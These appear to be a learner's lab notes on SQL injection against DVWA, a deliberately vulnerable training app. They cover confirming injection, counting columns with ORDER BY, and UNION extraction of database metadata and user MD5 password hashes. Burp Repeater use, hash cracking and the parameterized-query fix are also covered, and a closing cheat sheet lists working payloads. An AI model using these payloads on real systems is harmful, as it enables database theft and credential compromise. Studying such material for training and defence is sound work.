# Day 9 Notes — SQL Injection on DVWA

---

## 1. What We Did Today Overview

- Understood what SQL Injection is and why it works
- Confirmed SQL Injection vulnerability using error-based testing
- Found number of columns using ORDER BY technique
- Extracted database version, name, table names, and user credentials using UNION attack
- Did the full attack both in the browser and through Burp Repeater

---

## 2. What is SQL Injection

### The concept
Most web apps store data in a database and query it using SQL. When you interact with a form — logging in, searching, looking up a user ID — the app builds a SQL query using your input and sends it to the database.

A typical query looks like:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
```

SQL Injection happens when the app puts your input **directly into the query without sanitizing it.** If you include SQL syntax in your input you can break out of the intended query and write your own.

### Why the apostrophe `'` is the key
The `'` apostrophe closes the string that the app opened around your input. Everything after it is interpreted as raw SQL — not as data.

So if you type `1'` the query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1''
```
That extra `'` breaks the SQL syntax → database throws an error → you've confirmed injection is possible.

### Why this is critical in real hacking
SQL Injection can lead to:
- Dumping entire databases including usernames and passwords
- Bypassing login without knowing credentials
- Reading files from the server
- In some cases writing files and getting remote code execution
- **Critical severity — one of the most impactful web vulnerabilities**

---

## 3. The Comment Characters

When injecting SQL you need to comment out the rest of the original query so it doesn't interfere with your payload.

| Character | Works in | Usage |
|---|---|---|
| `--` | MySQL, MSSQL | Needs a space after: `-- -` |
| `#` | MySQL / MariaDB | No space needed, more reliable |
| `/**/` | Most databases | Inline comment |

**What we found:** On this DVWA setup (MariaDB 10.1.26) the `#` character worked reliably while `--` caused errors. Always test both when attacking a real target.

---

## 4. Step by Step — What We Did and What Each Step Proved

### Step 1 — Confirm normal behavior
**Input:** `1`

**Output:**
```
ID: 1
First name: admin
Surname: admin
```
Normal behavior — app fetched user ID 1 from the database. Baseline confirmed.

---

### Step 2 — Confirm SQL injection is possible
**Input:** `1'`

**Output:** SQL syntax error

The `'` broke the query. Error confirms the input is going directly into a SQL query unsanitized. **Injection confirmed.**

---

### Step 3 — Confirm OR bypass works
**Input:** `1' OR '1'='1#`

**Output:** All users returned

The query became:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'#
```
`'1'='1'` is always true → WHERE condition always true → every row returned. This is how SQL injection login bypasses work — more on that in future labs.

---

### Step 4 — Find number of columns using ORDER BY
ORDER BY tells the database to sort results by a column number. If you ORDER BY a column that doesn't exist you get an error.

**Input:** `1' ORDER BY 1#`
**Output:**
```
ID: 1' ORDER BY 1#
First name: admin
Surname: admin
```
Works — column 1 exists.

**Input:** `1' ORDER BY 2#`
**Output:** Results returned — column 2 exists.

**Input:** `1' ORDER BY 3#`
**Output:** SQL error — column 3 doesn't exist.

**Result: 2 columns confirmed.** This is essential before running a UNION attack — your UNION SELECT must have the exact same number of columns as the original query.

---

### Step 5 — Extract database version
**Input:** `1' UNION SELECT null, version()#`

**Output:**
```
ID: 1' UNION SELECT null, version()#
First name: admin
Surname: admin
ID: 1' UNION SELECT null, version()#
First name: (empty)
Surname: 10.1.26-MariaDB-0+deb9u1
```

**What this means:**
- First result = original query result for user ID 1 (normal)
- Second result = our UNION injection result
- `null` mapped to First name (displayed as empty)
- `version()` mapped to Surname (displayed the database version)
- Database is **MariaDB 10.1.26** — a MySQL fork

**Why we used `null` for the first column:** We don't care about the first column's value right now. `null` is a safe placeholder that works with any data type.

---

### Step 6 — Extract database name
**Input:** `1' UNION SELECT null, database()#`

**Output:**
```
Surname: dvwa
```

Database name is **dvwa**. Now we know what database to target for further enumeration.

---

### Step 7 — Extract all table names
**Input:**
```
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#
```

**Output:**
```
Surname: guestbook
Surname: users
```

**What is information_schema:**
`information_schema` is a special built-in database in MySQL/MariaDB that contains metadata about all other databases — their tables, columns, data types, and more. It's like a map of the entire database system. Attackers always query it first to understand the structure before extracting data.

**What we found:**
- `guestbook` table — stores the guestbook entries from the XSS stored lab
- `users` table — stores usernames and passwords — this is the target

---

### Step 8 — Extract column names from users table
**Input:**
```
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#
```

**Output:** Column names including `user`, `password`, `first_name`, `last_name`, `avatar`

Now we know exactly which columns to target. `user` and `password` are what we want.

---

### Step 9 — Dump all usernames and passwords
**Input:** `1' UNION SELECT user, password FROM users#`

**Output:**
```
First name: admin      Surname: admin
First name: admin      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb    Surname: e99a18c428cb38d5f260853678922e03
First name: 1337       Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo      Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Full database dump achieved. All usernames and their hashed passwords extracted.

---

## 5. What Are Those Password Hashes

The passwords aren't stored in plain text — they're stored as **MD5 hashes.** A hash is a one-way function that converts a password into a fixed-length string.

| Username | Hash | Actual Password |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

### How attackers crack MD5 hashes
MD5 is a weak hashing algorithm. Attackers use:
- **Rainbow tables** — pre-computed tables of hash → password mappings
- **Online hash crackers** — sites like crackstation.net where you paste the hash and get the password
- **Hashcat / John the Ripper** — offline tools that brute force hashes

### Why this matters
In a real bug bounty or pentest if you dump a database and find MD5 hashes you can often crack them in seconds using crackstation.net. SHA-256 and bcrypt are much stronger — much harder to crack.

### Note on admin having two entries
Both `admin` (first name field) and `admin` (username field) appeared because of how DVWA stores data. The first row is the original query result, the second is our UNION injection result pulling from the users table.

---

## 6. The Full UNION Attack Flow

```
1. Confirm injection with '  →  get SQL error
         ↓
2. Find columns with ORDER BY  →  error on ORDER BY 3 = 2 columns
         ↓
3. Find output column with UNION SELECT null, version()  →  version appears in col 2
         ↓
4. Get database name with database()
         ↓
5. Get table names from information_schema.tables
         ↓
6. Get column names from information_schema.columns
         ↓
7. Dump target data with UNION SELECT user, password FROM users
```

This exact flow works on any UNION-based SQL injection. Memorize it.

---

## 7. Doing SQLi Through Burp Repeater

### Why use Burp instead of the browser
- Faster to test multiple payloads — just edit and click Send
- No URL encoding issues — Burp sends exactly what you type
- Can see the raw response HTML — easier to spot injected data
- Can save requests and replay them later
- Essential for real bug bounty work

### What we did
1. Turned Intercept ON in Burp
2. Submitted `id=1` in DVWA browser
3. Request froze in Burp — found `id=1` in the URL parameters
4. Right clicked → Send to Repeater → clicked Forward → Intercept OFF
5. In Repeater changed `id=1` to:
```
id=1' UNION SELECT user, password FROM users#
```
6. Clicked Send → raw HTML response appeared on the right
7. All usernames and password hashes visible in the response

### The difference you see in Burp vs browser
- Browser shows you the rendered page — nice formatted output
- Burp shows you raw HTML — you need to look through it for your data
- Use Ctrl+F in Burp's response panel to search for specific strings like `admin` or `5f4dcc`

---

## 8. SQLi vs XSS — Key Differences

| | SQL Injection | XSS |
|---|---|---|
| Target | The database | The victim's browser |
| What you inject | SQL code | JavaScript code |
| What you get | Database contents | Session cookies, keystrokes |
| Where it executes | On the server | In the victim's browser |
| Severity | Critical | High to Critical |
| Fix | Parameterized queries | Input sanitization + output encoding |

Both are input validation failures — the app trusted user input it shouldn't have. Different injection language, different impact.

---

## 9. How to Fix SQL Injection

### The vulnerable code (what DVWA does)
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```
Your input goes straight into the string. No protection at all.

### The fix — parameterized queries (prepared statements)
```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```
The `?` is a placeholder. The database treats the value as pure data — never as SQL code. Even if you type `1' OR '1'='1` it gets treated as a literal string, not SQL syntax. Injection impossible.

### Why this fix works
With parameterized queries the SQL structure is sent to the database first — completely separate from the data. The database compiles the query structure before it ever sees your input. Your input can never change the structure because the structure is already locked in.

---

## 10. Payloads Cheat Sheet

```sql
-- Confirm injection
1'

-- OR bypass (dump all rows)
1' OR '1'='1#

-- Find column count
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#   ← error here = 2 columns

-- Find output column
1' UNION SELECT null, version()#

-- Get database name
1' UNION SELECT null, database()#

-- Get all table names
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#

-- Get column names from a table
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#

-- Dump usernames and passwords
1' UNION SELECT user, password FROM users#
```

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| SQL Injection | Injecting SQL code into a query via unsanitized user input |
| `'` apostrophe | Breaks out of the string in a SQL query |
| `#` comment | Comments out the rest of the original query in MySQL/MariaDB |
| ORDER BY | Used to find number of columns in the result set |
| UNION attack | Appends a second query to extract data from other tables |
| information_schema | Built-in MySQL database containing metadata about all tables and columns |
| MD5 hash | Weak password hashing algorithm — crackable in seconds |
| Parameterized query | The correct fix — separates SQL structure from user data |
| MariaDB | MySQL fork — uses `#` as comment character |

---

*Day 9 complete. You manually extracted a full database including usernames and crackable password hashes using nothing but a browser and Burp. That's the core of SQL injection done. Next up: automated SQLi with sqlmap and moving into OWASP Top 10 deeper topics.*
